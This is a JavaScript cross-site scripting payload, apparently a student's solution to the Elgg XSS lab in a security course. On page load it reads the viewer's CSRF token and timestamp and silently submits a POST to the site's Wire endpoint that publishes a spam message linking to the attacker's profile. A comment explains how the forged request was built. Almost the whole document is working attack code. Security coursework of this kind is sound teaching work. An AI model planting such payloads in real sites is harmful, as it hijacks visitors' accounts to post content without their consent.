<script type="text/javascript">
	window.onload = function(){
		
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		
	
		var body = "&body=&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy";
		var sendurl="http://www.xsslabelgg.com/action/thewire/add";
		var content = token + ts + body;
		
		
		if(elgg.session.user.guid != elgg.page_owner.guid)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}

		/* I have first posted a similar post from Alice’s the wire tab. Then I have inspected how the post
request was sent for this particular positing. Then wrote the body and concatenated it with ts
and token to make the content and then kept the post URL into the sendurl variable. then I have
written them into a js file. */
	}
</script>
